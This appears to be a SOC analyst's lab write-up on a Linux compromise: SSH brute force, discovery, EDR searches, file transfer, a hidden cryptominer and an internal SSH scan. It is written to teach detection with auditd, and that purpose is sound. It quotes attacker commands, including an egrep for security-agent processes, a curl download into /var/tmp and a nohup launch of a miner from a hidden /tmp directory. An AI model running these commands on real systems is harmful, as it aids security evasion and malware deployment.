# Linux Threat Detection 2 — Discovery & Malware Investigation

## Overview

This investigation focuses on identifying **post-compromise discovery activity and malicious tool execution on a Linux system**.

After obtaining access to a host, attackers commonly gather information about the compromised environment before deciding what actions to perform next. This can include identifying the operating system, available resources, logged-in users, running processes, security software and reachable systems.

The investigation examines how legitimate Linux commands can be abused during attacker reconnaissance and how `auditd`, authentication logs and process context can be used to distinguish normal administrative behaviour from malicious activity.

The investigation then follows a Linux compromise involving:

- SSH brute-force access
- System discovery
- Security-tool discovery
- Ingress tool transfer
- Malicious archive deployment
- Cryptominer execution
- Internal network scanning

The objective was to correlate these individual activities into a broader attack sequence.

---

# Investigation Objectives

The investigation focused on the following objectives:

- Identify common Linux discovery techniques
- Distinguish legitimate discovery activity from attacker reconnaissance
- Investigate commands using `auditd`
- Trace suspicious commands back to their parent process
- Identify scripts responsible for automated discovery
- Detect security-tool and EDR discovery
- Identify ingress tool transfer using `wget`, `curl` and `scp`
- Differentiate legitimate and suspicious file downloads
- Investigate an SSH brute-force compromise
- Identify attacker reconnaissance after initial access
- Detect malicious archive transfer and extraction
- Identify cryptominer execution
- Detect internal network scanning
- Correlate attacker behaviour into a complete incident timeline

---

# Skills Demonstrated

- Linux threat detection
- `auditd` investigation
- `ausearch`
- SSH authentication analysis
- Discovery detection
- Process-tree analysis
- Command-line analysis
- Defence discovery detection
- Ingress tool transfer detection
- `wget` and `curl` analysis
- SCP transfer analysis
- Malware execution investigation
- Cryptominer detection
- Network reconnaissance analysis
- Attacker TTP correlation
- Incident timeline reconstruction

---

# Data Sources & Tools

| Source / Tool | Purpose |
| :--- | :--- |
| `/var/log/auth.log` | Analyse SSH authentication activity |
| `auditd` | Record command and process execution |
| `ausearch` | Search Linux audit events |
| `ps` | Review running processes |
| `grep / egrep` | Search process and log data |
| `cat` | Inspect scripts and files |
| `last` | Review previous login activity |
| `wget` | Investigate file downloads |
| `curl` | Investigate HTTP-based file transfers |
| `scp` | Investigate SSH-based file transfers |
| Process IDs / PPIDs | Trace process relationships |

---

# 1. Understanding Linux Discovery

Once attackers obtain access to an unfamiliar system, one of their first objectives is often to determine:

```text
Who am I?
Where am I?
What system am I on?
What resources are available?
What security controls are running?
Who else uses this system?
What other systems can I reach?
```

Common Linux commands used to answer these questions include:

```bash
whoami
id
hostname
uname -a
pwd
ls
ps aux
last
ip addr
```

These commands are not inherently malicious.

System administrators use them constantly.

The challenge for the analyst is therefore not simply identifying that a command was executed.

The important question is:

> **Who executed it, what launched it, and what other activity occurred around it?**

---

# 2. Establishing Command Context

Consider the following activity:

```text
hostname
```

By itself, this provides very little evidence of malicious behaviour.

An administrator may legitimately execute the command while troubleshooting.

For example:

```text
Administrator
     ↓
SSH Session
     ↓
Bash
     ↓
hostname
```

This process chain would generally be expected.

Now consider:

```text
Unknown Script
     ↓
hostname
     ↓
whoami
     ↓
ps
     ↓
Network Discovery
```

The behaviour becomes more interesting because several discovery commands are being executed automatically.

This demonstrates why **process context and surrounding activity** are critical during Linux investigations.

---

# 3. Investigating Discovery with auditd

Linux `auditd` telemetry can be used to investigate how a command was launched.

For example:

```bash
ausearch -i -x hostname
```

Relevant fields may include:

```text
Executable
Command
Process ID
Parent Process ID
User
Working Directory
Timestamp
```

Suppose the investigation identifies:

```text
Command: hostname
User: itsupport
Parent Process: debug.sh
```

The suspicious command can now be traced back to:

```text
/home/itsupport/debug.sh
```

Instead of treating `hostname` as an isolated alert, the analyst can investigate the script responsible for executing it.

---

# 4. Script-Based Discovery

The script can be examined directly:

```bash
cat /home/itsupport/debug.sh
```

Alternatively, child processes associated with the script can be investigated through audit telemetry.

For example:

```bash
ausearch -i --ppid <PROCESS_ID>
```

This allows the analyst to reconstruct commands launched by the script.

The discovery sequence included commands used to collect information about the system and running processes.

One of the final commands examined running processes together with memory and CPU utilisation:

```bash
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu
```

This type of command can be useful for legitimate troubleshooting.

However, attackers may also use it to determine:

- Which processes consume the most resources
- Whether security products are running
- Whether the system is suitable for cryptomining
- Which applications may be valuable targets

Context determines whether the activity is legitimate or suspicious.

---

# 5. Resource Discovery

Attackers deploying cryptominers are particularly interested in hardware resources.

Relevant discovery activity may involve determining:

```text
CPU availability
Memory availability
Virtualisation environment
Cloud environment
GPU availability
Current resource utilisation
```

Commands such as:

```bash
lscpu
free -m
ps aux
systemd-detect-virt
```

may therefore appear during a cryptomining attack.

Again, these commands are normal administrative tools.

Their significance increases when they occur:

```text
Immediately after compromise
        +
From an unexpected account
        +
Alongside malware transfer
        +
Before high-CPU processes begin
```

---

# 6. Security Tool Discovery

Attackers may attempt to determine whether security software is installed before deploying malware.

Running processes can be examined using:

```bash
ps aux
```

Attackers may then filter the output for security-related process names.

For example:

```bash
ps aux | egrep "ds_agent|falcon|sentinel"
```

This type of activity may indicate **defence discovery**.

The attacker is attempting to determine whether endpoint detection or monitoring products are present.

Potential attacker decisions may then include:

```text
Security product found
       ↓
Attempt evasion or terminate attack

Security product not found
       ↓
Continue malware deployment
```

Security-product discovery is especially suspicious when performed shortly after an unauthorised login.

---

# 7. Why Discovery Requires Behavioural Analysis

A command such as:

```bash
ps aux
```

cannot automatically be considered malicious.

Likewise:

```bash
hostname
```

or:

```bash
last
```

may be entirely legitimate.

Detection therefore needs to consider:

```text
User
+
Parent Process
+
Command
+
Time
+
Authentication History
+
Subsequent Activity
```

For example:

```text
Normal Administrator
        ↓
SSH Login
        ↓
ps aux
```

may be legitimate.

However:

```text
Brute-Forced Account
        ↓
Successful Login
        ↓
hostname
        ↓
last
        ↓
ps aux
        ↓
Search for EDR Processes
```

strongly suggests attacker reconnaissance.

---

# 8. Ingress Tool Transfer

After completing reconnaissance, attackers often need to transfer additional tools onto the compromised host.

This technique is commonly referred to as **Ingress Tool Transfer**.

Common Linux utilities include:

```text
wget
curl
scp
```

Each utility is legitimate and widely used.

However, they can also be abused to download:

- Malware
- Scripts
- Exploitation tools
- Credential stealers
- Cryptominers
- Network scanners
- Persistence utilities

---

# 9. Detecting wget Activity

`auditd` can be searched for executions of `wget`:

```bash
ausearch -i -x wget
```

An analyst should examine:

```text
Source URL
Destination path
Executing user
Parent process
Timestamp
Command arguments
```

A legitimate software download might appear as:

```text
wget
 ↓
Known vendor domain
 ↓
Expected software package
 ↓
Expected installation path
```

This activity may not require escalation.

---

# 10. Detecting curl Activity

The same approach can be used for `curl`:

```bash
ausearch -i -x curl
```

During the investigation, a suspicious script was transferred to:

```text
/var/tmp/helper.sh
```

A command performing this activity could resemble:

```bash
curl <REMOTE_URL> -o /var/tmp/helper.sh
```

The `/var/tmp` directory is commonly writable and can therefore be attractive to attackers.

A file download becomes increasingly suspicious when:

- The domain is unfamiliar
- The destination is a temporary directory
- The file is executable
- The download follows suspicious authentication
- The file is immediately executed
- The parent process is unexpected

---

# 11. Legitimate vs Suspicious Downloads

The download utility itself does not determine whether an event is malicious.

For example:

```text
wget
 ↓
Known software vendor
 ↓
Signed package
 ↓
Expected installation
```

is likely legitimate.

However:

```text
curl
 ↓
Unknown infrastructure
 ↓
Shell script
 ↓
/var/tmp
 ↓
Immediate execution
```

deserves significantly more investigation.

The analyst should evaluate the entire event rather than classifying `curl` or `wget` as malicious.

---

# 12. SSH Brute-Force Compromise

The larger incident began with an exposed SSH service.

Authentication activity indicated repeated attempts against the host followed by a successful authentication.

The source responsible for the successful attack was:

```text
45.9.148.125
```

The activity can be represented as:

```text
45.9.148.125
       ↓
Repeated SSH Authentication Attempts
       ↓
Credential Brute Force
       ↓
Successful Authentication
       ↓
Linux Host Compromised
```

This established the initial entry point for the subsequent attacker activity.

---

# 13. Post-Compromise Discovery

After gaining access, the attacker began gathering information about the system.

One command used was:

```bash
last
```

The `last` command displays previous login activity.

This can help an attacker identify:

- Active users
- Frequently used accounts
- Source addresses
- Login history
- Administrative patterns

An administrator may legitimately use this command.

However, when executed immediately after a brute-force compromise, it becomes part of the attacker's reconnaissance activity.

---

# 14. Defence Discovery

The attacker then searched for several endpoint-security processes.

The processes targeted included:

```text
ds_agent
falcon
sentinel
```

This behaviour suggests that the attacker wanted to determine whether endpoint detection or monitoring software was present before continuing.

The activity can be represented as:

```text
Successful Compromise
        ↓
System Discovery
        ↓
Process Enumeration
        ↓
Search for Security Products
        ↓
Continue Attack
```

This is an important example of how apparently harmless utilities such as `ps` and `egrep` can become security indicators when analysed within the correct context.

---

# 15. Malicious File Transfer

After reconnaissance, the attacker transferred additional files to the compromised host.

A malicious archive named:

```text
kernupd.tar.gz
```

was transferred using SCP.

The attack sequence now included:

```text
SSH Compromise
      ↓
Discovery
      ↓
Defence Discovery
      ↓
SCP File Transfer
      ↓
kernupd.tar.gz
```

SCP is legitimate and frequently used by administrators.

However, an unexpected SCP transfer occurring during a confirmed compromise should be investigated immediately.

---

# 16. Why SCP Can Be Difficult to Detect

Unlike a command such as:

```bash
wget https://example.com/file
```

the attacker can initiate SCP from the remote system.

The destination host may therefore primarily observe:

```text
SSH Authentication
        ↓
SSH Session
        ↓
File Transfer
```

This makes SSH authentication telemetry particularly important when investigating suspicious SCP activity.

Relevant evidence may include:

- Source IP
- Target account
- Authentication timestamp
- File creation time
- Destination path
- Subsequent execution

---

# 17. Malware Deployment

After transferring the malicious archive, the attacker prepared the payload for execution.

Attackers often use hidden or temporary directories to make malicious files less obvious.

Suspicious locations may include:

```text
/tmp
/var/tmp
/dev/shm
Hidden directories beginning with "."
```

The investigation showed malware components being placed inside temporary or concealed paths.

This is not automatically malicious because legitimate software can also use temporary directories.

However, the combination of:

```text
Confirmed compromise
+
Unexpected archive
+
Temporary directory
+
Executable files
+
Immediate execution
```

provides strong evidence of malicious activity.

---

# 18. Cryptominer Execution

The attacker launched a cryptomining binary using:

```bash
nohup /tmp/.apt/kernupd/kernupd
```

`nohup` allows a process to continue running after the initiating shell or session has closed.

This makes it useful for legitimate long-running tasks.

It is also useful to attackers because malware can continue operating after the attacker disconnects.

The activity can be represented as:

```text
Malicious Archive
       ↓
Payload Extraction
       ↓
Cryptominer Binary
       ↓
nohup
       ↓
Background Execution
```

---

# 19. Detecting nohup Abuse

The use of `nohup` alone is not malicious.

Analysts should examine:

```text
Executable path
Command arguments
Parent process
User
File creation time
Network connections
CPU utilisation
```

For example:

```text
nohup
  ↓
Known administrative script
```

may be legitimate.

However:

```text
nohup
  ↓
Hidden /tmp directory
  ↓
Unknown executable
  ↓
High CPU utilisation
```

is considerably more suspicious.

---

# 20. Cryptomining Indicators

Potential indicators of cryptomining activity include:

```text
Unexpected high CPU utilisation
Unknown processes consuming CPU
Executables launched from /tmp
Hidden executable directories
Connections to mining infrastructure
Resource-discovery commands
Long-running background processes
```

No single indicator proves that cryptomining is occurring.

The analyst must correlate multiple behaviours.

For example:

```text
SSH Brute Force
      ↓
Successful Login
      ↓
CPU Discovery
      ↓
Malware Transfer
      ↓
Hidden Executable
      ↓
High CPU Process
```

provides significantly stronger evidence.

---

# 21. Internal Network Scanning

The attacker also deployed functionality designed to identify additional SSH systems.

The observed scan targeted:

```text
10.10.12.1 - 10.10.12.10
```

The purpose was to locate additional systems exposing SSH that could potentially be compromised.

This changes the incident from a single-host malware infection into potential **propagation activity**.

The attack progression becomes:

```text
Compromise Host A
       ↓
Deploy Malware
       ↓
Launch Scanner
       ↓
Search Internal Network
       ↓
Identify SSH Systems
       ↓
Potential Additional Compromise
```

---

# 22. Network Scanner Activity

One malware component operated as a network scanner.

Such activity may produce indicators including:

```text
Rapid connections to multiple hosts
Repeated connections to port 22
Sequential IP scanning
Unusual internal connection patterns
Unknown scanning process
```

Analysts investigating a compromised Linux system should therefore examine not only inbound activity but also **outbound and lateral network behaviour**.

A compromised server can become an attack platform for targeting additional systems.

---

# 23. Reconstructing the Attack Chain

By correlating authentication, audit and process telemetry, the complete attack sequence can be reconstructed.

```text
External Attacker
       │
       ▼
SSH Brute Force
       │
       ▼
Successful Authentication
       │
       ▼
System Discovery
       │
       ├── User Discovery
       ├── Login History
       ├── CPU / Resource Discovery
       └── Process Discovery
       │
       ▼
Defence Discovery
       │
       ├── ds_agent
       ├── falcon
       └── sentinel
       │
       ▼
Ingress Tool Transfer
       │
       ▼
kernupd.tar.gz
       │
       ▼
Payload Extraction
       │
       ▼
Cryptominer Execution
       │
       ▼
Background Execution with nohup
       │
       ▼
Internal Network Scanning
       │
       ▼
Search for Additional SSH Targets
```

This demonstrates how multiple low-level events can combine into a complete compromise.

---

# 24. Key Findings

| Finding | Assessment |
| :--- | :--- |
| Repeated SSH attempts from an external source | Suspicious |
| Successful login following brute-force activity | Confirmed compromise indicator |
| Login-history enumeration | Discovery |
| CPU and process enumeration | System / resource discovery |
| Search for EDR processes | Defence discovery |
| Unexpected SCP transfer | Suspicious ingress tool transfer |
| `kernupd.tar.gz` transferred | Malicious payload |
| Executable launched from hidden `/tmp` path | Highly suspicious |
| `nohup` used to maintain execution | Malware execution |
| Internal SSH scanning | Propagation activity |

---

# 25. Indicators of Compromise

## Network Indicator

```text
45.9.148.125
```

Associated with the SSH brute-force compromise.

---

## Malicious Archive

```text
kernupd.tar.gz
```

Associated with malware delivery.

---

## Suspicious Executable Path

```text
/tmp/.apt/kernupd/kernupd
```

Associated with cryptominer execution.

---

## Malicious Execution

```bash
nohup /tmp/.apt/kernupd/kernupd
```

---

## Defence Discovery Targets

```text
ds_agent
falcon
sentinel
```

---

## Internal Scan Range

```text
10.10.12.1 - 10.10.12.10
```

---

# 26. Analyst Reasoning

The central challenge in this investigation was distinguishing **legitimate Linux administration from attacker behaviour**.

Commands such as:

```text
hostname
ps
last
curl
wget
scp
nohup
```

are not malicious utilities.

Blocking or alerting on every execution would generate large numbers of false positives.

Instead, detection should focus on combinations of events.

For example:

```text
SSH brute force
      +
Successful login
      +
Discovery commands
      +
EDR process search
      +
Unexpected file transfer
      +
Execution from /tmp
```

provides a much stronger indication of malicious activity than any individual event.

---

# 27. Key SOC Lessons

## Discovery Commands Need Context

A discovery command should not automatically trigger an incident.

The analyst should determine:

```text
Who ran it?
What process launched it?
When was it executed?
Was the account expected to perform this activity?
What happened immediately before and afterwards?
```

---

## Attackers Frequently Use Legitimate Tools

The investigation demonstrated the use or potential abuse of:

```text
SSH
ps
last
grep
egrep
curl
wget
scp
nohup
```

These are standard Linux utilities.

This reinforces the importance of **behavioural detection** rather than simply searching for malicious program names.

---

## Defence Discovery Is Valuable Context

Searching specifically for security products can significantly increase the confidence that surrounding activity is malicious.

A user executing:

```bash
ps aux
```

may be normal.

A recently compromised account executing:

```bash
ps aux | egrep "ds_agent|falcon|sentinel"
```

is far more concerning.

---

## File Transfer Must Be Correlated with Execution

A downloaded file is not necessarily malicious.

The investigation should continue to determine:

```text
Where was it stored?
Was it executable?
Who executed it?
Which process launched it?
Did it make network connections?
Did it persist?
```

This prevents investigations from stopping at the file-transfer stage.

---

## Temporary Directories Deserve Attention

Attackers frequently use writable Linux directories such as:

```text
/tmp
/var/tmp
/dev/shm
```

Executables launched from hidden directories inside these locations deserve additional scrutiny, particularly during an active compromise.

---

## Compromised Hosts Can Become Attack Platforms

The incident did not end after malware execution.

The infected system began searching for additional SSH services on the internal network.

This demonstrates why containment is critical.

Leaving one compromised Linux host online can allow attackers or automated malware to use it to target additional systems.

---

# 28. Recommended SOC Response

If this activity were identified in a production environment, appropriate response actions would include:

1. **Isolate the affected Linux host** from the network.

2. **Disable or secure the compromised account** and reset affected credentials.

3. **Block the malicious source IP** where appropriate.

4. **Terminate identified malicious processes** after collecting required evidence.

5. **Preserve relevant authentication, audit and network logs** for investigation.

6. **Identify and quarantine transferred malware**, including associated archives and executables.

7. **Review SSH configuration**, particularly password authentication and root access.

8. **Inspect `authorized_keys` and account configuration** for persistence.

9. **Search other systems for the same indicators**, including filenames, executable paths, hashes and source addresses.

10. **Investigate internal hosts contacted by the scanner** to determine whether lateral compromise occurred.

11. **Review outbound network traffic** for mining pools, command-and-control infrastructure or additional malicious connections.

12. **Determine the full scope of compromise** before returning the system to service.

---

# Conclusion

This investigation demonstrated how attacker behaviour can be identified on Linux by correlating **authentication activity, command execution, process telemetry, file transfers and network behaviour**.

The incident began with SSH brute-force activity that resulted in successful access to the target system. After gaining access, the attacker performed reconnaissance to understand the host, examined login history and system resources, and searched specifically for endpoint-security processes.

The attacker then transferred additional files to the compromised system, deployed a malicious payload and launched a cryptomining process from a concealed temporary directory. The compromised host was subsequently used to scan internal systems for additional exposed SSH services.

The most important lesson from the investigation was that many attacker actions rely on **legitimate Linux utilities**.

Commands such as `ps`, `last`, `curl`, `wget`, `scp` and `nohup` cannot be treated as malicious in isolation. Their value as security indicators comes from understanding the **user, parent process, authentication history, command arguments, file paths, timing and surrounding activity**.

By correlating these events, the activity could be understood as a complete attack sequence:

```text
SSH Brute Force
      ↓
Successful Compromise
      ↓
Discovery
      ↓
Defence Discovery
      ↓
Ingress Tool Transfer
      ↓
Malware Execution
      ↓
Cryptomining
      ↓
Internal Network Scanning
```

The investigation strengthened practical skills in:

- Linux discovery detection
- `auditd` analysis
- Process and command-line investigation
- SSH compromise analysis
- Defence discovery detection
- Ingress tool transfer investigation
- Malware execution analysis
- Cryptominer detection
- Internal network scanning detection
- Attacker TTP correlation
- Incident timeline reconstruction

These techniques are directly applicable to SOC investigations where analysts must move beyond identifying individual alerts and determine **how an attacker entered the environment, what they discovered, what tools they deployed, what those tools did, and whether additional systems may be affected**.
